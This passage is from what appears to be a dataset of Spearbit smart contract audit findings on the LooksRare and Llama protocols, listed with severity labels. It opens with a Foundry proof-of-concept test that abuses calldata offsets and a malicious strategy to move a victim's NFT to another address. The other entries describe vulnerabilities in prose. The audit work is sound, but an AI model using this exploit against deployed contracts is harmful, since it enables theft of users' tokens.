private signingOwnerPK = 42; address private signingOwner = vm.addr(signingOwnerPK); // this address will define an offset in the calldata // and can be changed up to a certain upperbound by // stuffing calldata with 0s. address private specialUser1 = address(0x180); // NFT token recipient of the attack can also be changed // up to a certain upper bound by stuffing the calldata with 0s address private specialUser2 = address(0x3a0); // can be an arbitrary address address private victimUser = address(505); function setUp() public override { super.setUp(); vm.startPrank(_owner); { looksRareProtocol.initiateOwnershipTransfer(signingOwner); } vm.stopPrank(); vm.startPrank(signingOwner); { looksRareProtocol.confirmOwnershipTransfer(); mockERC20 = new MockERC20(); looksRareProtocol.updateCurrencyWhitelistStatus(address(mockERC20), true); looksRareProtocol.updateCreatorFeeManager(address(0)); mockERC20.mint(victimUser, 1000); mockERC721.mint(victimUser, 1); // This particular strategy is not a requirement of the exploit. // it just makes it easier payloadStrategy = new PayloadStrategy(); looksRareProtocol.addStrategy( 0, 0, 0, PayloadStrategy.execute.selector, true, address(payloadStrategy) ); itemSelectorStrategy = new ItemSelectorStrategy(); looksRareProtocol.addStrategy( 0, 0, 0, ItemSelectorStrategy.execute.selector, false, address(itemSelectorStrategy) ); } 64 vm.stopPrank(); _setUpUser(victimUser); } function testAttack() public { vm.startPrank(signingOwner); looksRareProtocol.addTransferManagerForAssetType( 2, address(looksRareProtocol), looksRareProtocol.restrictedExecuteTakerBid.selector ); payloadStrategy.set( address(mockERC721), address(mockERC20), 0, victimUser, 2 // itemSelectorStrategy ID ); itemSelectorStrategy.set(1, 1); OrderStructs.MakerBid memory makerBid = _createSingleItemMakerBidOrder({ // payloadStrategy bidNonce: 0, subsetNonce: 0, strategyId: 1, assetType: 2, // LooksRareProtocol itself orderNonce: 0, collection: address(0x80), // calldata offset currency: address(mockERC20), signer: signingOwner, maxPrice: 0, itemId: 1 }); bytes memory signature = _signMakerBid(makerBid, signingOwnerPK); OrderStructs.TakerAsk memory takerAsk; vm.stopPrank(); vm.prank(specialUser1); looksRareProtocol.executeTakerAsk( takerAsk, makerBid, signature, _EMPTY_MERKLE_TREE, _EMPTY_AFFILIATE ); assertEq(mockERC721.balanceOf(victimUser), 0); assertEq(mockERC721.ownerOf(1), specialUser2); } }", "labels": ["Spearbit", "LooksRare", "Severity: Informational"]}, {"title": "viewCreatorFeeInfo can be simplified", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "viewCreatorFeeInfo includes a low-level staticcall to collection's royaltyInfo endpoint and later its return status is compared and the return data is decoded.", "labels": ["Spearbit", "LooksRare", "Severity: Informational"]}, {"title": "_verifyMerkleProofOrOrderHash can be simplified", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "_verifyMerkleProofOrOrderHash includes a if/else block that calls into _computeDigestAndVer- ify with almost the same inputs (only the hash is different).", "labels": ["Spearbit", "LooksRare", "Severity: Informational"]}, {"title": "isOperatorValidForTransfer can be modified to refactor more of the logic", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "isOperatorValidForTransfer is only used to revert if necessary. The logic around the revert decision on all call sites.", "labels": ["Spearbit", "LooksRare", "Severity: Informational"]}, {"title": "Keep maximum allowed number of characters per line to 120.", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "There are a few long lines in the code base. contracts/executionStrategies/StrategyCollectionOffer.sol 21:2 27:2 29:2 30:2 67:2 69:2 70:2 118:2 119:2 error error error error error error error error error Line length must be no more than 120 but current length is 127 Line length must be no more than 120 but current length is 163 Line length must be no more than 120 but current length is 121 Line length must be no more than 120 but current length is 121 Line length must be no more than 120 but current length is 163 Line length must be no more than 120 but current length is 121 Line length must be no more than 120 but current length is 121 Line length must be no more than 120 but current length is 123 Line length must be no more than 120 but current length is 121 max-line-length max-line-length max-line-length max-line-length max-line-length max-line-length max-line-length max-line-length max-line-length contracts/executionStrategies/StrategyDutchAuction.sol 20:2 22:2 23:2 26:5 70:31 85:2 86:2 92:5 error error error warning warning error error warning Line length must be no more than 120 but current length is 163 Line length must be no more than 120 but current length is 121 Line length must be no more than 120 but current length is 121 Function has cyclomatic complexity 9 but allowed no more than 7 Avoid to make time-based decisions in your business logic Line length must be no more than 120 but current length is 123 Line length must be no more than 120 but current length is 121 Function has cyclomatic complexity 8 but allowed no more than 7 max-line-length max-line-length max-line-length code-complexity not-rely-on-time max-line-length max-line-length code-complexity contracts/executionStrategies/StrategyItemIdsRange.sol 15:2 20:2 21:2 22:2 23:2 25:5 100:2 101:2 error error error error error warning error error Line length must be no more than 120 but current length is 142 Line length must be no more than 120 but current length is 163 Line length must be no more than 120 but current length is 163 Line length must be no more than 120 but current length is 121 Line length must be no more than 120 but current length is 121 Function has cyclomatic complexity 12 but allowed no more than 7 Line length must be no more than 120 but current length is 123 Line length must be no more than 120 but current length is 121 max-line-length max-line-length max-line-length max-line-length max-line-length code-complexity max-line-length max-line-length contracts/helpers/OrderValidatorV2A.sol 40:2 ,! 53:2 ,! error Line length must be no more than 120 but current length is 121 error Line length must be no more than 120 but current length is 121 max-line-length max-line-length 69 225:2 ,! 279:2 ,! 498:24 ,! 501:26 ,! 511:2 ,! 593:5 ,! 662:5 ,! 758:5 ,! 830:5 ,! 843:17 ,! 850:17 ,! 906:5 ,! 963:5 ,! 12:2 ,! 18:2 ,! 23:2 ,! 49:5 ,! 81:2 ,! 144:2 ,! error Line length must be no more than 120 but current length is 127 max-line-length error Line length must be no more than 120 but current length is 127 max-line-length warning Avoid to make time-based decisions in your business logic not-rely-on-time warning Avoid to make time-based decisions in your business logic not-rely-on-time error Line length must be no more than 120 but current length is 143 max-line-length warning Function has cyclomatic complexity 9 but allowed no more than 7 warning Function has cyclomatic complexity 9 but allowed no more than 7 code-complexity code-complexity warning Function order is incorrect, internal view function can not go after internal pure function (line 727) ordering warning Function has cyclomatic complexity 10 but allowed no more than 7 code-complexity warning Avoid to use inline assembly. It is acceptable only in rare cases no-inline-assembly warning Avoid to use inline assembly. It is acceptable only in rare cases warning Function has cyclomatic complexity 8 but allowed no more than 7 no-inline-assembly code-complexity warning Function has cyclomatic complexity 8 but allowed no more than 7 code-complexity contracts/helpers/ValidationCodeConstants.sol 17:2 18:2 error error Line length must be no more than 120 but current length is 129 Line length must be no more than 120 but current length is 121 max-line-length max-line-length contracts/interfaces/ILooksRareProtocol.sol 160:2 error Line length must be no more than 120 but current length is 122 max-line-length contracts/libraries/OrderStructs.sol error Line length must be no more than 120 but current length is 292 error Line length must be no more than 120 but current length is 292 max-line-length max-line-length error Line length must be no more than 120 but current length is 127 max-line-length warning Function order is incorrect, struct definition can not go after state variable declaration (line 26) ordering error Line length must be no more than 120 but current length is 128 max-line-length error Line length must be no more than 120 but current length is 131 max-line-length 49 problems (34 errors, 15 warnings)", "labels": ["Spearbit", "LooksRare", "Severity: Informational"]}, {"title": "avoid transferring in _transferFungibleTokens when sender and recipient are equal", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "Currently, there is no check in _transferFungibleTokens to avoid transferring funds from sender to recipient when they are equal. There is only one check outside of _transferFungibleTokens when one wants to transfer to an affiliate. But if the bidUser is the creator, or the ask recipient or the protocolFeeRecipient, the check is missing.", "labels": ["Spearbit", "LooksRare", "Severity: Informational"]}, {"title": "Keep the order of parameters consistent in updateStrategy", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "In updateStrategy, isActive is set first when updating storage, and it's the second parameter when supplied to the StrategyUpdated event. But it is the last parameter supplied to updateStrategy.", "labels": ["Spearbit", "LooksRare", "Severity: Informational"]}, {"title": "_transferFungibleTokens does not check whether the amount is 0", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "_transferFungibleTokens does not check whether amount is 0 to skip transferring to recipient. For the ask recipient and creator amounts the check is performed just before calling this function. But the check is missing for the affiliate and protocol fees.", "labels": ["Spearbit", "LooksRare", "Severity: Informational"]}, {"title": "StrategyItemIdsRange.executeStrategyWithTakerAsk - Maker's bid amount might be entirely ful- filled by a single ERC1155 item", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "StrategyItemIdsRange allows a buyer to specify a range of potential item ids (both ERC721 and ERC1155) and a desired amount, then a seller can match the buyer's request by picking a subset of items from the provided range so that the desired amount of items are eventually fulfilled. a taker might pick a single ERC1155 item id from the range and fulfill the entire order with multiple instances of that same item.", "labels": ["Spearbit", "LooksRare", "Severity: Informational"]}, {"title": "Define named constants", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": " ExecutionManager.sol#L289 : 0x7476320f is cast sig \"OutsideOfTimeRange()\"  TransferSelectorNFT.sol#L30 : 0xa7bc96d3 is cast sig \"transferItemsERC721(address,address,address,uint256[],uint256[])\" and can be replaced by TransferManager.transferItemsERC721.selector  TransferSelectorNFT.sol#L31 : 0xa0a406c6 is cast sig \"transferItemsERC1155(address,address,address,uint256[],uint256[])\" and can be replaced by TransferManager.transferItemsERC1155.selector.", "labels": ["Spearbit", "LooksRare", "Severity: Informational"]}, {"title": "price validation in executeStrategyWithTakerAsk, executeCollectionStrategyWithTakerAsk and executeCollectionStrategyWithTakerAskWithProof can be relaxed", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "In the above context, a maker is bidding a maximum price pmax and a taker is asking a minimum price pmin, the strategy should calculate a price p in the range [pmin, pmax ] and so we would need to have pmin (cid:20) pmax . The above strategies pick the execution price to be pmax (the maximum price bid by the maker), and since the taker is the caller to the protocol we would only need to require pmin (cid:20) pmax . But the current requirement is pmin = pmax . if ( ... || makerBid.maxPrice != takerAsk.minPrice) { revert OrderInvalid(); }", "labels": ["Spearbit", "LooksRare", "Severity: Informational"]}, {"title": "Change occurances of whitelist to allowlist and blacklist to blocklist", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "In the codebase, whitelist (blacklist) is used to represent entities or objects that are allowed (denied) to be used or perform certain tasks. This word is not so accurate/suggestive and also can be offensive.", "labels": ["Spearbit", "LooksRare", "Severity: Informational"]}, {"title": "Add more documentation on expected priceFeed decimals", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "The Chainlink strategies are making the following assumptions 1. All priceFeeds in StrategyFloorFromChainlink have a decimals value of 18. 2. The priceFeed in StrategyUSDDynamicAsk has a decimals value of 8. Any priceFeed that is added that does not match these assumptions would lead to incorrect calculations.", "labels": ["Spearbit", "LooksRare", "Severity: Informational"]}, {"title": "Code duplicates", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "* In some places, Chainlink staleness is checked using block.timestamp - updatedAt > maxLa- tency, and in other places it is checked using block.timestamp > maxLatency + updatedAt. Consider refactor- ing this code into a helper function. Otherwise, it would be better to use only one version of the two code snippets across the protocol.  The validation check to match assetType with the actual amount of items being transferred is duplicated among the different strategies instead of being implemented at a higher level once, such as in a common function or class that can be reused among the different strategies.  _executeStrategyForTakerAsk and _executeStrategyForTakerBid almost share the same code.  TakerBid, TakerAsk can be merged into a single struct.  MakerBid, MakerAsk can be merged into a single struct.", "labels": ["Spearbit", "LooksRare", "Severity: Informational"]}, {"title": "Low level calls are not recommended as they lack type safety and won't revert for calls to EOAs", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "Low-level calls are not recommended for interaction between different smart contracts in modern versions of the compiler, mainly because they lack type safety, return data size checks, and won't revert for calls to Externally Owned Accounts.", "labels": ["Spearbit", "LooksRare", "Severity: Informational"]}, {"title": "Insufficient input validation of orders (especially on the Taker's side)", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "There is a lack of consistency in the validation of parameters, as some fields of the taker's order are checked against the maker's order while others are not. It is worth noting that we have not identified any significant impact caused by this issue.  Missing validation of strategyId  Missing validation of collection  Most strategies only validate length mismatches on one side of the order. Also, they don't usually validate that the lengths match between both sides. For example, in the DutchAuction strategy, if the makerAsk has itemIds and amounts arrays of length 2 and 2, then it would be perfectly valid for the takerBid to use itemIds and amounts arrays of length 5 and 7, as long as the first two elements of both arrays match what is expected. (FYI: I filed a related issue for the ItemIdsRange strategy, which I think is more severe of an issue because the mismatched lengths can actually be returned from the function).", "labels": ["Spearbit", "LooksRare", "Severity: Informational"]}, {"title": "LooksRareProtocol's owner can take maker's tokens for signed orders with unimplemented strat- egyIds", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "If a maker signs an order that uses a strategyId that hasn't been added to the protocol yet, the protocol owner can add a malicious strategy afterward such that a taker would be able to provide no fulfillment but take all the offers.", "labels": ["Spearbit", "LooksRare", "Severity: Informational"]}, {"title": "Strategies with faulty price feeds can have unwanted consequences", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "In LooksRare protocol once a strategy has been added its implementation and selector cannot be updated. This is a good since users who sign their MakerBid or MakerAsk can trustlessly examine the strategy implementation before including them into their orders. Some strategies might depend on other actors such as price feeds. This is the case for StrategyUSDDynamicAsk and StrategyFloorFromChainlink. If for some reason these price feeds do not return the correct prices, these strategies can have a slight deviation from their original intent. Case StrategyUSDDynamicAsk If the price feed returns a lower price, a taker can bid on an order with that lower price. This scenario is guarded by MakerAsk's minimum price. But the maker would not receive the expected amount if the correct price was reported and was greater than the maker's minimum ask. Case StrategyFloorFromChainlink For executeFixedDiscountCollectionOfferStrategyWithTakerAsk and executeBasisPointsDiscountCollec- tionOfferStrategyWithTakerAsk if the price feeds reports a floor price higher than the maker's maximum bid price, the taker can match with the maximum bid. Thus the maker ends up paying more than the actual floor adjusted by the discount formula. For executeFixedPremiumStrategyWithTakerBid and executeBasisPointsPremiumStrategyWithTakerBid if the price feeds report a floor price lower than the maker's minimum ask price, the taker can match with the minimum ask price and pay less than the actual floor price (adjusted by the premium).", "labels": ["Spearbit", "LooksRare", "Severity: Informational"]}, {"title": "The provided price to IERC2981.royaltyInfo does not match the specifications", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "royaltyFeeRegistry.royaltyInfo does not return a non-zero creator address, we check whether the collection supports IERC2981 and if it does, we loop over each itemId and call the collection's royaltyInfo endpoint. But the input price parameters provided to this endpoint do not match the specification of EIP-2981: CreatorFeeManagerWithRoyalties, CreatorFeeManagerWithRebates and /// @param _salePrice - the sale price of the NFT asset specified by _tokenId 78 The price provided in viewCreatorFeeInfo functions, is the price for the whole batch of itemIds and not the individual tokens itemIds[i] provided to the royaltyInfo endpoint. Even if the return values (newCreator, newCreatorFee) would all match, it would not mean that newCreatorFee should be used as the royalty for the whole batch. An example is that if the royalty is not percentage-based, but a fixed price.", "labels": ["Spearbit", "LooksRare", "Severity: Informational"]}, {"title": "Replace the abi.encodeWithSelector with abi.encodeCall to ensure type and typo safety", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "In the context above, abi.encodeWithSelector is used to create the call data for a call to an external contract. This function does not guarantee that mismatched types are used for the input parameters.", "labels": ["Spearbit", "LooksRare", "Severity: Informational"]}, {"title": "Use the inline keccak256 with the formatting suggested when defining a named constant for an EIP-712 type hash", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "Hardcoded byte32 EIP-712 type hashes are defined in the OrderStructs library.", "labels": ["Spearbit", "LooksRare", "Severity: Informational"]}, {"title": "The castApprovalBySig and castDisapprovalBySig functions can revert", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Llama-Spearbit-Security-Review.pdf", "body": "The castApprovalBySig and castDisapprovalBySig functions are used to cast an approve or disapprove via an off-chain signature. Within the _preCastAssertions a check is performed against the strategy using msg.sender instead of policy- holder, the strategy (e.g. AbsoluteStrategy) uses that argument to check if the cast sender is a policyholder. isApproval ? actionInfo.strategy.isApprovalEnabled(actionInfo, msg.sender) : actionInfo.strategy.isDisapprovalEnabled(actionInfo, msg.sender); While this works for normal cast, using the ones with signatures will fail as the sender can be anyone who calls the method with the signature signed off-chain.", "labels": ["Spearbit", "Llama", "Severity: Critical Risk"]}, {"title": "The castApproval/castDisapproval doesn't check if role parameter is the approvalRole", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Llama-Spearbit-Security-Review.pdf", "body": "A policyholder should be able to cast their approval for an action if they have the approvalRole defined in the strategy. It should not be possible for other roles to cast an action. The _castApproval method verifies if the policyholder has the role passed as an argument but doesn't check if it actually has approvalRole which is eligible to cast an approval. This means any role in the llama contract can participate in the approval with completely different quantities (weights). The same problem occurs for the castDisapproval function as well.", "labels": ["Spearbit", "Llama", "Severity: Critical Risk"]}, {"title": "Reducing the quantity of a policyholder results in an increase instead of a decrease in totalQuan- tity", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Llama-Spearbit-Security-Review.pdf", "body": "In Llama policyholder can approve or disapprove actions. Each policyholder has a quantity which represents their approval casting power. It is possible to update the quantity of individual policyholder with the setRoleHolder function in the LlamaPolicy. The _setRoleHolder method is not handling the decrease of quantity correctly for the totalQuantity. The totalQuantity describes the sum of the quantities of the individual policyholders for a specific role. In the case of a quantity change, the difference is calculated as follows: uint128 quantityDiff = initialQuantity > quantity ? initialQuantity - quantity : quantity - ,! initialQuantity; However, the quantityDiff is always added instead of being subtracted when the quantity is reduced. This results in an incorrect tracking of the totalQuantity. Adding the quantityDiff should only happen in the increase case. See: LlamaPolicy.sol#L388 // case: willHaveRole=true, hadRoleQuantity=true newTotalQuantity = currentRoleSupply.totalQuantity + quantityDiff;", "labels": ["Spearbit", "Llama", "Severity: High Risk"]}, {"title": "LlamaPolicy.revokePolicy cannot be called repeatedly and may result in burned tokens retaining active roles", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Llama-Spearbit-Security-Review.pdf", "body": "Llama has two distinct revokePolicy functions. The first revokePolicy function removes all roles of a policyholder and burns the associated token. This function iterates over all existing roles, regardless of whether a policyholder still holds the role. In the next step the token is burned. If the total number of roles becomes too high, this transaction might not fit into one block. A second version of the revokePolicy function allows users to pass an array of roles to be removed. This approach should enable the function to be called multiple times, thus avoiding an \"out-of-gas\" error. An out-of-gas error is currently not very likely considering the maximum possible role number of 255. However, the method exists and could be called with a subset of the roles a policyholder. The method contains the following check: if (balanceOf(policyholder) == 0) revert AddressDoesNotHoldPolicy(policyholder); Therefore, it is not possible to call the method multiple times. The result of a call with a subset of roles would lead to an inconsistent state. The token of the policyholder is burned, but the policyholder could still use the remaining roles in Llama. Important methods like LlamaPolicy.hasRole don't check if LlamaPolicy.sol#L250) the token has been burned. (See", "labels": ["Spearbit", "Llama", "Severity: Medium Risk"]}, {"title": "Role, permission, strategy, and guard management or config errors may prevent creating/approving/queuing/executing actions", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Llama-Spearbit-Security-Review.pdf", "body": "LlamaCore deployment from the factory will only succeed if one of the roles is the BOOTSTRAP_ROLE. As the comments note: // There must be at least one role holder with role ID of 1, since that role ID is initially // given permission to call `setRolePermission`. This is required to reduce the chance that an // instance is deployed with an invalid configuration that results in the instance being unusable. // Role ID 1 is referred to as the bootstrap role. There are still several ways a user can misstep and lose access to LlamaCore.  Bootstrap Role Scenarios While the bootstrap role is still needed: 1. Setting an expiry on the bootstrap role's policyholder RoleHolderData and allowing the timestamp to pass. Once passed any caller may remove the BOOTSTRAP_ROLE from expired policyholders. 2. Removing the BOOTSTRAP_ROLE from all policyholders. 3. Revoking the role's permission with setRolePermission(BOOTSTRAP_ROLE, bootstrapPermissionId, false).  General Roles and Permissions Similarly, users may allow other permissions to expire, or remove/revoke them, which can leave the contract in a state where no permissions exist to interact with it. The BOOTSTRAP_- ROLE would need to be revoked or otherwise out of use for this to be a problem.  Misconfigured Strategies A misconfigured strategy may also result in the inability to process new actions. For example: 1. Setting minApprovals too high. 2. Setting queuingPeriod unreasonably high 3. Calling revokePolicy when doing so would make policy.getRoleSupplyAsQuantitySum(approvalRole) fall below minApprovals (or fall below minApprovals - actionCreatorApprovalRoleQty). 1 & 2 but applied to disapprovals. And more, depending on the strategy (e.g. if a strategy always responded true to isActive).  Removal of Strategies It should not be possible to remove the last strategy of a Llama instance It is possible to remove all strategies from an Ilama instance. It would not be possible to create a new action afterward. An action is required to add other strategies back. As a result, the instance would become unusable, and access to funds locked in the Accounts would be lost.  Misconfigured Guards An accidentally overly aggressive guard could block all transactions. There is a built-in protection to prevent guards from getting in the way of basic management if (target == address(this) || target == address(policy)) revert CannotUseCoreOrPolicy();. Again, the BOOTSTRAP_ROLE would need to be revoked or otherwise out of use for this to be a problem.", "labels": ["Spearbit", "Llama", "Severity: Medium Risk"]}, {"title": "LlamaPolicy.hasRole doesn't check if a policyholder holds a token", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Llama-Spearbit-Security-Review.pdf", "body": "Incorrect usage of the revokePolicy function can result in a case, where the token of a policyholder is already burned but still holds a role. The hasRole function doesn't check if in addition to the role the policyholder still holds the token to be active. The role could still be used in the Llama system.", "labels": ["Spearbit", "Llama", "Severity: Medium Risk"]}, {"title": "Incorrect isActionApproved behavior if new policyholders get added after the createAction in the same block.timestamp", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Llama-Spearbit-Security-Review.pdf", "body": "Llama utilizes Checkpoints to store approval quantities per timestamp. If the current quantity changes, the previous values are preserved. The block.timestamp of createAction is used as a snapshot for the approval. (See: LlamaCore.sol#L597) Thus, in addition to the Checkpoints, the totalQuantity or numberOfHolders at the createAction are included in the snapshot. However, if new policyholders are added or their quantities change after the createAction within the same block.timestamp, they are not considered in the snapshot but remain eligible to cast an approval. For example, if there are four policyholders together 50% minimum approval: If a new action is created and two policyholders are added subsequently within the same block.timestamp. 9 The numberOfHolders would be 4 in the snapshot instead of 6. All 6 policyholders could participate in the approval, and two approvals would be sufficient instead of 4. Adding new policyholders together with creating a new action could happen easily in a llama script, which allows to bundle different actions. If a separate action is used to add a new policyholder, the final execution happens via a public callable function. An attacker could exploit this by trying to execute the add new policyholder action if a new action is created", "labels": ["Spearbit", "Llama", "Severity: Medium Risk"]}, {"title": "LlamaCore delegate calls can bring Llama into an unusable state", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Llama-Spearbit-Security-Review.pdf", "body": "The core contract in Llama allows the execution of actions through a delegate_call. An action is executed as a delegate_call when the target is added as an authorizedScript. This enables batching multiple tasks into a contract, which can be executed as a single action. In the delegate_call, a script contract could modify arbitrary any slot of the core contract. The Llama team is aware of this fact and has added additional safety-checks to see if the slot0 has been modified by the delegate_call. The slot0 contains values that should never be allowed to change. bytes32 originalStorage = _readSlot0(); (success, result) = actionInfo.target.delegatecall(actionInfo.data); if (originalStorage != _readSlot0()) revert Slot0Changed(); A script might be intended to modify certain storage slots. However, incorrect SSTORE operations can completely break the contracts. For example, setting actionsCount = type(uint).max would prevent creating any new actions, and access to funds stored in the Account would be lost.", "labels": ["Spearbit", "Llama", "Severity: Medium Risk"]}, {"title": "The execution opcode of an action can be changed from call to delegate_call after approval", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Llama-Spearbit-Security-Review.pdf", "body": "In Llama an action only defines the target address and the function which should be called. An action doesn't implicitly define if the opcode should be a call or a delegate_call. This only depends on whether the target address is added to authorizedScripts mapping. However, adding a target to the authorizedScripts can be done after the approval in a different action. The authorizedScript action could use a different set of signers with a different approval strategy. The change of adding a target to authorizedScript should not impact actions which are already approved and in the queuing state. This could lead to security issues when policyholders approved the action under the assumption the opcode will be a call instead of a delegate call.", "labels": ["Spearbit", "Llama", "Severity: Medium Risk"]}, {"title": "LlamaFactory is governed by Llama itself", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Llama-Spearbit-Security-Review.pdf", "body": "Llama uses their own governance system to govern the LlamaFactory contract. The LlamaFactory contract is responsible for authorizing new LlamaStrategies. We can identify several potential drawbacks with this approach. If only a single strategy contract is used and a critical bug is discovered, the implications could be significant. In such a scenario, it would mean a broken strategy contract needs to be used by the Factory governance to deploy a fixed version of the strategy contract or enable other strategies. The likelihood for this to happen is still low but implications could be critical.", "labels": ["Spearbit", "Llama", "Severity: Low Risk"]}, {"title": "The permissionId doesn't include call or delegate-call for LlamaAccount.execute", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Llama-Spearbit-Security-Review.pdf", "body": "The decision if LlamaAccount.execute is a delegate_call depends on the bool flag parameter withDelegatecall. This parameter is not included in the permissionId, which controls role permissions in Llama. The permissionId in Llama is calculated in the following way: PermissionData memory permission = PermissionData(target, bytes4(data), strategy); bytes32 permissionId = keccak256(abi.encode(permission)); The permissionId required for a role to perform an action only includes the function signature but not the param- eters themselves. It is impossible to define the opcode as part of the permissionId.", "labels": ["Spearbit", "Llama", "Severity: Low Risk"]}, {"title": "Nonconforming EIP-712 typehash", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Llama-Spearbit-Security-Review.pdf", "body": "Incorrect strings used in computing the EIP-712 typehash. 1. The strings contain space( ) after comma(,) which is not standard EIP-712 behaviour. 2. ActionInfo is not used in typehash. There will be a mismatch when comparing to hashes produced by JS libs or solidity (if implemented), etc.. Not adhering to EIP-712 spec means wallets will not render correctly and any supporting tools will produce a different typehash.", "labels": ["Spearbit", "Llama", "Severity: Low Risk"]}, {"title": "Various events do not add the role as parameter", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Llama-Spearbit-Security-Review.pdf", "body": "Note: During the audit, the client discovered an issue that affects their offchain infrastructure. Various events do not emit the role as parameter: 1. event ActionCreated(uint256 id, address indexed creator, ILlamaStrategy indexed strategy, address indexed target, uint256 value, bytes data, string description); 2. event ApprovalCast(uint256 id, address indexed policyholder, uint256 quantity, string reason); 3. event DisapprovalCast(uint256 id, address indexed policyholder, uint256 quantity, string reason);", "labels": ["Spearbit", "Llama", "Severity: Low Risk"]}, {"title": "LlamaCore doesn't check if minExecutionTime returned by strategy is in the past", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Llama-Spearbit-Security-Review.pdf", "body": "The minExecutionTime returned by a strategy is not validated.", "labels": ["Spearbit", "Llama", "Severity: Low Risk"]}, {"title": "Address parsing from tokenId to address string does not account for leading 0s", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Llama-Spearbit-Security-Review.pdf", "body": "Policy tokenIds are derived from the holder's account address. The address is intended to be displayed in the svg generated when calling tokenURI. Currently, leading 0s are truncated rendering the incorrect address string: e.g. 0x015b... vs 0x0000...be60 for address 0x0000000000015B23C7e20b0eA5eBd84c39dCbE60.", "labels": ["Spearbit", "Llama", "Severity: Low Risk"]}, {"title": "The ALL_HOLDERS_ROLE can be set as a force role by mistake", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Llama-Spearbit-Security-Review.pdf", "body": "During the initialization, an array of roles that must be assigned as force approval/disapproval can be sent. The logic does not account for ALL_HOLDERS_ROLE (which is role id 0, the default value of uint8) which can be sent as a mistake by the user. This is a low issue as if the above scenario happens, the strategy can become obsolete which will render the owner redeploy the strategy with correct initialization configs. We must mention that the force roles can not be changed after they are set within the initialization.", "labels": ["Spearbit", "Llama", "Severity: Low Risk"]}, {"title": "LlamaPolicy.setRolePermission allows to set permissions for non existing roles", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Llama-Spearbit-Security-Review.pdf", "body": "It is possible to set a permission for a role that doesn't exist, yet. In other functions like assigning a role to a policyholder, this check happens. (See: LlamaPolicy.sol#L343) A related issue, very close to this, is the updateRoleDescription method which can emit an event for a role that does not exists. This is just an informational issue as it does not affect with anything the on-chain logic, might affect off-chain logic if any logic will ever rely on it.", "labels": ["Spearbit", "Llama", "Severity: Low Risk"]}, {"title": "The RoleAssigned event in LlamaPolicy emits the currentRoleSupply instead of the quantity", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Llama-Spearbit-Security-Review.pdf", "body": "During the audit, the client discovered an issue that affects their off-chain infrastructure. The RoleAssigned event in LlamaPolicy emits the currentRoleSupply instead of the quantity. From an off-chain perspective, there is currently no way to get the quantity assigned for a role to a policyholder at Role Assignment time. The event would be more useful if it emitted quantity instead of currentRoleSupply (since the latter can be just be calculated off-chain from the former).", "labels": ["Spearbit", "Llama", "Severity: Low Risk"]}, {"title": "ETH can remain in the contract if msg.value is greater than expected", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Llama-Spearbit-Security-Review.pdf", "body": "When an action is created, the creator can specify an amount of ETH that needs to be sent when executing the transaction. This is necessary in order to forward ETH to a target call. Currently, when executing the action the msg.value is checked to be at least the required amount of ETH needed to be forwarded. if (msg.value < actionInfo.value) revert InsufficientMsgValue(); This can result in ETH remaining in the contract after the execution. From our point of view, LlamaCore should not hold any balance of ETH.", "labels": ["Spearbit", "Llama", "Severity: Low Risk"]}, {"title": "Cannot re-authorize an unauthorized strategy config", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Llama-Spearbit-Security-Review.pdf", "body": "Strategies are deployed using a create2 salt. The salt is derived from the strategy config itself (see LlamaCore.sol#L709-L710). This means that any unauthorized strategy cannot be used in the future, even if a user decides to 